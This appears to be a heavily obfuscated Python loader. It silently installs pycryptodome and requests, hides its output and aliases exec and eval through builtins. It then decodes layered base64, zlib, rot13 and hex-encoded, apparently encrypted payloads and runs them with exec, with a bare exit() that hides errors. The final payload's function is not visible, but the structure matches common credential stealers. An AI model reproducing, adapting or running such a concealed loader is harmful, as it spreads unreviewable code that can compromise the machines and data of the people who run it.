import random ,base64,codecs,zlib,sys;py=""
import warnings, subprocess

def check_installation(package):
    try:
        subprocess.run(["pip3", "show", package], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True 
    except subprocess.CalledProcessError:
        return False

warnings.filterwarnings("ignore", category=Warning)

if not check_installation("pycryptodome"):
    subprocess.run(["pip3", "install", "pycryptodome"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

if not check_installation("requests"):
    subprocess.run(["pip3", "install", "requests"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


try:
    sys.setrecursionlimit(1000000000) 

    pyobfuscate = (lambda **kwargs: (list(kwargs.keys()),list(kwargs.values())))(**{'https://pyobfuscate.com':'ConnectionAbortedError / type','exec':'hMrilUNaIuASB0NWCeyMrRSiSIxtsvHI40geK0GkfXyAIigR8X6Y6SXMZl4Ve8sonEXVf5RWQsKi0n6y','eval': bytes.fromhex('''14b493b36f049f92a60a76d6060f0f701ce3485c331b82ea31fe084c3c8740a381a6ce63fe91739e34d794d14f842fccc19defa0a09ece2c3c1edeab99e6cc8f82f639eda0495da6b4a61e5408d7cd874ebded5eae7d28ad0edb0dc3c6f14f77c0ad9d54d8bff5d7d973d058550857f7e45d11a989698e9f281626bc624dd3b4d44643170307848b0f6d7a78fc9dc11793feee91dd1e41875a8d2c9c6ce7b30ef76486e8ee2d1fad57e79ac5e9e863ccd41edce2596cc5d0340717e8141d1f6c9a61d418a4a143fb39a66159bcdd89d89e1d7d354f3db2142bdba32ae27c427f9ed179c11d331865cf804b0a27e2ba48b41954eefe0df04419adae26649f4542c0be6f22d327d6aa58ea3c04913b2fa65939432a838370edd61808ba23d75fbcc856b096c94b339aed4329c4f96e9065bdc07d34f0e635fd65c4bc7fdedf8a430da78c5fe3eb39fbe97a60c78ad8ac934b3f1f0866ed1f193f43d1296cf1469376c0c3ed4a5d60586d5abf97d255bbe16ead9bbe012f3c3b8437ef23397fe588d513d54040929331a225899042a5ccc2f8072bb142c098bc5d516f292c0687b7ab876407311b3b31ca4344be18f235071d8fdfe3d9b81031c728164600d0daa88a7a4d6cfd31398f2593789b8afa88a3d166e63c0eed7dcd506e9bc77a77585df7f4733c2804a42496d477da774c3ccab50641bc24cb77023268b78658a28761b00ea29a2fba75c8b7c60fdd277fe61bed87019515792a6ae8a9c00f8bc86cc59c23ecd355029f40b81e4b08ad3b45c1f225054a07373edefb7842e32187fb714475d74b2a4970b05821f806271f66cadd86b2df7aa45f7a5dea00f60f33f63a972f85bc623602607b185a97903be3987ee2ded74a0491e7757c675ae87f8b54533f4733359816273532288ae18bf6fbd3da7196e235ce7b0f380980c89c58be15b3315c195be37ac01349f55e826945f5e8c283516e73fb734847be022a78904c92422c5562552a085f3391c786e0c28b1d14b4f22c501fa5048f7da1531889f04debe3d61b81680f7a2371016bcc5ac97d5c3f217ad779c12322035d27f3a143e84bf57a1393bb2959972318308d0a42a1b46209656a9c54b425bff37d6b0620670810badb3ecda877d37eef1c51df813c99c192c44b9e24e1323fb5201f92ee9c3cde48c9b6bb7e7f90a04a21a3e85cb775a41ea333b99d5adb27a3305d55d6cc4e0f9db61c4183024d090cda0b088814c48d7e36b6eda9330fb6f63002e7aa765a104ac29912f4052ab3e54a8aa4a88ae5d9331549ff0cce407855facf06740fea01d5ef9f4055d6dd20493938adcfe2638f2a1a43f2f77badb4175997e9785369dbc74e0a0a6f7da92c505f7a08582e39d60bf04fc8fabf5bfb025ad069647b1dec24a3379a0d87286b1d300a0b53fc8b9309c006e9ad911c59d99bd46b590ac0d00e566a588b134c49def5da80bb779b1c04abc212877a2e40fb7e78f40c9056a06d24a74bee080530d20dfd827da6554cd71cbf27953c4267c32e324d36a79833152265a506174c0b27599cc75184b7e0998d9421fae579769308bef0987a110ac03904be4a8e9c5dee76a988a4c83615cbc4f0d6d187d0af0e957ed600427e62a38d9a776f64d3184e1bd0632406befa1e2ecddc8f39ad298d17245b005c914db20d27acb9961c275bea6af8ff3dd6e77b42dacd8ee0a2830961823708ba0b534deee17c27ccde486655769f26b4ef348f2a10de73174d5c5ce9384d030d041f1c789e11a547433e6b2885601dec176d0dad08c292c0284426ea35113ff992dfb5261a49424be2ecc90b257878a1231b6d15a4a3e1df77828fb9ed2fca1dfce5f388a89638e8150415d331378a7832e3b1a162cd4e3e4a9cb78a3a3d578c8eb1a2e4452c1a51c781d4798fb85a8aa7e03dec50828af694863b82c527eb1452437491c6aa443d63a79023c573ca3ee0d05702864e9f7b9ede297a3b4f34125f9e2aa38e6c433fa77f9fd25dd4e840be9d8f0625a05556730aa2d0bb18920336b64ebb7a1c623bc6fcbaa57bfcb24e781a8b66b35844802b74a935f4284ebc22b0f510e5747c56332615b302997e6529b3fcc1c6691389f1cf58f828315e20924a65493b4bbe2eca5c0f5ff26e512cb1fa848dfb61f5f657c4ea1e1a1394b9e32d736722ebb71651b3287468976c1e6298b614d09304e9a9b904326f326ff2990f560919a45533fe246e0372e40ffbc113f90db6cab090638869cd34ea1790b068a42c91cb6375bf12c9aa1b18f6f5d69202b0ebe45f522e89dff970813bf0ff02112347ce5ba1c42a9287db14f578f7bc5b491eb2cbe53bc827d253645e1a5b545111869fa38f2f05b2fd4a6bd3f5b3788bd27b1bc89c578c9dfe36311cb44cbde709dfcc34a77512923a074d48b44b25d832686d791a97486739941a8e0fc75959dd5826a77e87a6a186c2c7cb566b4d6c5da7c669e78e5945d1352980cf944f66540ec6529c79f260038a8ce859083358dea41cbe38c80e38680ed5ab955907d9d68dbdfb3c6eead26d141f019a9117bb3e0b20ad20de0bdce08cfad26f824ebbc9fe16f41afe7b0fe2d5fa1d2d550a9d0c2b0d9d180245d9111eecb69434614d69faa8c59dce5e677910cf2da3b0afac1038fb45a0944c7c122430aa3f944dfd0f354e9f24b065ee7393016c862a94ad1daf5db56351fdc15520500380a6e60e082b53778f926caffe5bd14fba6ddf3615b4964c7726f25a90498bbf9c2ad8df39b259137e693d66a4d0778bea1083b1a724ecd447862d70370ac9aa4fc5b7d25b55e4343f084897b1cbf94ad78afbefa66dcbe68d03397203e9f812ca87279d4a797b257085b8b4879508cfd68d98a26b890e2dfe4d6573f10c35125cdfbd7ebeaccc0d92dc329d5c6762cd354529daf3f9660168f2d03acce7719abdffddfcac0d29264987723a1f5ab45ea678791d1b4d403b5abdbfe97ebb0517610f251d6b684444c9ea73cc32ab5579d381a6f746bf67c92e7b514f0ff55aaa39a51492a9619b17acdfaf6f90df53a02754ff665aa4259a070eb2f4352b5f3aca0919fb4925377891dd585417fac05c38d5db68d05fd8c97aa31fbc50bc8e52bd4605ff98f37a05dc9b371d505f71065c748cb61acdaa28fa15060ca2330167bbe0d7314a5bba3ee1f2a2139c06cc6c83875108dd77304d7cf90286e499e0dd1f1d75ff07599accfb30f84f30d4defe16a1ca912f2b4885255ba1798cc90d95b4db75b4589514ecd645f156e3b68aa70656afd8f4e1a87425b0fb41fce6cf5b9fcf40b1ea248cf0028022bf024ddb1692d93318a35a26830781e3ee9680df2a6dd17aae580a5f561cb4504c693e6ed471f398f67cf55999c973fa8ab869d7ecbb765bab5d7aa0a69639c963ce5c077154aafe0ab6936ff891a295ea9de56c205e6026e22e835e641ede3a1a211cb8bbf4720a81e1c841ba9c51f1e81d0a926acd574a2e27c2065b60607fdef41f9c0236eeb1f3b6520bd11158f2e4a58282213eefd5
    8cf9004a61a1bef6c1f0ec9c806efd556b403c25ba50bbf0d59090868e251de2e7547cc0261d79c7f24bd270c3e928ae867a1a94638469d1d58d3874f536ec723402150f3666b3981f2b4a1adfcd0158d4d7aab2825fa20d1c46baecb9618e02777114a2da1e359da7caa1ed7d7f37abb9c8cc89043e5ca8c27e6e4f27dc87a9b3b4271a3e4128f2c847a61023ff9e20168c92cffb1f80efd205f9a1059ee091e5d0072c9f1b8c43728c3037fd286954f751815ea076613b3f68e53932f068e962630131611886fa1f4bb6a5111dc6ed10d24832ce43b8f458e2418bb8decb53f9b29af0471520135acaf9d7c9475bdc151fa88961d2c96a952f985f7c78230fb82588d14608d7b53b8312154a3217b56ea56640ab96222cb07df6f41cd5cce66a1db234bb054f2d45b1f31d8ada4e2e60f65ab9f094f7398b936db28ca129ca63c1e5082f86e3a62a39936bfbdf28aef80c368a9c8d77a14d9c6c93b2aada767763c4abfe050740f6384c57ff8cf9194f6e324d0416647a3c4c8eb0d41f91ef4f1686485cadf455460ebedbe39d699fc9e82722535d85bccaa987c74c8696841fa8c07c05608359c1db0eb15f3479b610a8138b5f030daa3a6a696bfb67bb37e5b6daae17d2603e36e12aaf2cd3f7f54d4753a9e5d53929dc9a86d2cc9c32247c471333c7b4f03bfd15d237deff712c887c3f824d73491db79dfb46895e2221770a8e75c44a0cdcef3e7d467e442774a15234af2faaea91c72496a695b45a7185863b67c8d1d58f502b6c8f7ccab9c0f74f79881701bc48c224f499f7e5ad8056d649b7f57daad31eb2f5c5b2399af4580471f6f6846a2b33160fec0a2465147ebf5dce15e7960a4d2e4ac2e896bd7f2d7f0cfa1064f2a59fddf79acded41d69e255c5c2d2a80975ea7813bf4d26db1dd4f2825257a9126b36ac3e18425f1049e389929f487b790b6ca53879680f2b81ac4c6c2c58baf4b59a76a61ed456ddd69d8155e6be530ad1372aa54dcc3670cbe07be2eec36d7f9b70256ed3a7b5491e44ebd22aa46744cdfc9cad04380a9e2066c6ab322f12633ee0451fef0302fc03c21b1a1aaa2ec03bad15768868fd4ff6865051fff519d9e1b116e9c5d9c946a51002435f8430aae926af9b4e47813e6233a9b11f35f1b04a6b6a1d864fbc96f3302e158fdbe70e0ce7198a3770a1ee75b8f60b063df590554fe1ea06c5e11603c40e61e495a08e8f7a796de3ba5e37c6b9fd3bc3fd00a19d59bbcd712c1a3a619c7f2e7f61553a0d1b769c29331c75fcead20f5f3fc651d9a9a491a'''.replace("\n","")) })

    _=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='173340 8805560 896154 1313092 2579318 789730 639744 257568 342528 2087616 2921076 4804986 6045060 9043621 825024 10964520 165236 10846079 7787403 5794673 5243655 299744 4538705 1367584 664545 6389362 10310720 9037509 7260204 3508768 653344 4463196 3208164 8624020 519530 6131205 7261440 4221063 1381882 6542480 4191892 498104 902270 320544 1697728 3039584 634528 7135856 1776462 1987965 967780 8944064 478680 3175192 3985072 4425435 10842048 1325728 7531440 7633010 5469975 1958892 4943120 5254416 4120092 1846784 1527714 7404714 10891392 9482031 8608937 1154255 9061224 1344465 2946950 2578613 3627143 5550195 3078790 5353600 331344 10291172 812960 1380026 7764848 5969382 5929609 362135 9281650 1440224 8175344 4208490 11217200 4794167 3007092 1178912 11069300 2271948 760160 4902795 804000 5517225 1789996 1516706 741321 4934996 1758309 2770440 1351875 8995800 359760 1477189 951180 181760 3479628 8529192 1587342 5133108 934755 1248856 1406160 1704386 8452184 10446148 3049408 8412656 11119810 1758908 3089686 1021498 9698528 5677683 10506594 192276 2354874 5461560 7644050 7106616 9152823 1089820 7449457 4295710 9534888 288267 6200901 2646758 3672592 6379120 2942600 4417671 1003174 2970612 10663030 2005416 3542756 8935320 2747460 2720034 2113058 1165272 4704612 6906077 7357080 5260484 336340 755160 6032766 6132159 1203094 77220 1732608 1854816 2815872 1970496 6815538 8029362 8617818 3163834 1564512 930846 3031055 181516 3260320 5728820 1546976 9100520 740000 7965930 8766543 10715040 6323559 5994690 1169164 1185536 566711 6388440 7032795 9826175 6728000 5532075 2583136 2931146 8405350 1619872 5879917 5016720 926550 2118496 3039936 1393344 727712 2516034 6586692 7821615 4410358 524576 7927176 5657655 1877632 5866665 7819006 10541440 1572759 4490688 2847916 2985984 813185 5925367 4485488 7177060 7200490 3422826 2657632 8254118 10564705 1563744 3411772 2394104 2061576 5512698 8648630 8651875 6691857 7866824 7225944 341040 115168 2461408 1892736 2048736 6437016 6276051 95634 501054 6113256 6333811 466080 2948985 846560 1669600 4671840 3008728 4262635 98280 1889095 1744275 1755374 3454686 8880704 1578927 5198115 8601012 10791309 5382432 2436896 1595654 4111848 5106092 5949689 5632770 6470360 3818828 5255612 3011880 10668172 2981664 4272485 9900464 205650 1949682 703728 5179038 1896444 3653065 2196094 1743308 3842012 4473588 7319060 5451206 1492424 3905952 4672560 3002312 697714 1109967 5291776 2804439 1548729 5403888 10338762 925452 4092181 2829990 6361616 3835572 4719923 2463289 9747055 1062950 678454 7926048 5279280 4518432 11968 386490 631840 2649152 1818368 2263936 2380832 329700 5344494 2636032 4348252 808080 1355880 1742832 1808051 707250 5317126 1565138 226800 10811874 9121905 1697507 2532802 641890 1702592 923808 1214848 2609888 2912320 987520 675008 3024608 7376712 5365322 4477066 5118543 3318868 299768 3844560 8749328 772436 3216901 5420 2566816 1867872 1405152 1125952 8029298 868428 10079160 3219120 1489120 8910220 496680 3599520 3528112 3003650 2780497 2540772 4462943 2447928 7969170 722007 4832446 5683014 346320 1151008 1722496 2352128 2965408 1188128 3167776 2512416 966080 10928154 5252606 8128675 465090 3124050 351682 796400 6614160 960700 2179314 658690 219936 2439968 2776128 1162688 3669435 2449428 2950304 9276749 3374520 3104000 11132240 3961374 545259 3273443 358741 6605060 3092942 10152000 4178525 180083 2362166 46690 2587136 177824 2894688 689920 2751584 1276544 2648288 3129632 1765841 9990750 3758632 7037264 796352 7664772 644896 3605397 657360 1030320 10002470 897492 7808202 2996120 918064 162894 1239471 3436180 3194232 2711296 2371024 311149 1360288 1846395 7323545 251744 9497030 148480 9319876 4303024 9047570 4703754 9365265 5626116 4798106 1910240 10078830 7144092 9834324 1653440 8642562 5062500 2781030 1635326 782240 2229568 1040608 802784 809984 6763768 11433480 1505809 1679931 1201560 5953818 10601808 7089190 5075510 448280 6688304 2111000 4030997 4081580 8018874 3351685 6049211 7803900 3757400 1161571 2562172 495520 2928896 3056576 406880 171936 118670 9409362 7237560 322542 1423797 139104 11566940 2242744 507990 29472 428640 1702240 1983808 10029199 9099840 8076061 7080084 3203200 4696896 7679232 1763451 943270 890070';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJyLKi/JcnL3M3UKLDFxCizIigosMY1yrzAGAGYBCAQ=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kMtugzAURH8pOKCGpSPiBoOjIFxj2AFteIRXWhtsf33dtOruzGikmXuzYSlZmcnZnLoZeSPBoeKp/xU5hyo26Uhe411uGID0pGPgK4LkNgPL+6IlNHwyf6tvE2Z/2ukXE47LINc4ghpuQRtv8e4/S1nNkacIhh2h54qje/+JvPcZ6JZTWC2rrOcyqCZ0cDlSghh/YFSJCbsCj+perL04JsLNrxev2MSNJYX348Hk4kZI1bkJ29+dwvao+ghCl+CiegDp8b3uHqiRizl/2I2SUN2SodlNVI8cSGe6Ptl66mUxqb3Hb/ISaoKDqkBqzeyvvgEFpGq5")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')

except Exception as e:
    exit()
